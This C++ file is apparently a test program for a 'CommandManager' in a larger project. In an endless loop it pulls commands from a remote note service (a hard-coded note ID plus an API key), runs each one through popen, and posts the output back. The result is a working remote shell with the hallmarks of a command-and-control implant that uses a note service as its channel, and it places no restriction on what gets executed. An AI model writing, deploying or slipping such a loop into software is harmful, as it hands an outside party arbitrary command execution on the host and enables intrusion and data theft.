#include <cstdlib>
#include <iostream>
#include "../src/api.hpp"
#include "../src/command.hpp"

const std::string NOTE_ID = "Kx43mmtdQkCzWnpy-tBOMA";

std::string exec_cmd(const std::string& cmd) {
    std::string result;
    char buffer[256];

    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) {
        throw std::runtime_error("popen() failed");
    }

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    pclose(pipe);
    return result;
}

int main() {
    const char* api_key_env = std::getenv("API_KEY");
    if (!api_key_env) {
        std::cerr << "Error: API_KEY environment variable not set"
                  << std::endl;
        return 1;
    }
    std::string api_key(api_key_env);
    std::cout << "This is a simple test for CommandManager." << std::endl;
    API api(api_key);
    CommandManager cmdManager(&api, NOTE_ID);
    while (true) {
        std::string cmd = cmdManager.receive_command();
        std::cout << "Received command: " << cmd << std::endl;
        std::string output = exec_cmd(cmd);
        std::cout << "Command output: " << output << std::endl;
        cmdManager.send_response(output);
    }

    return 0;
}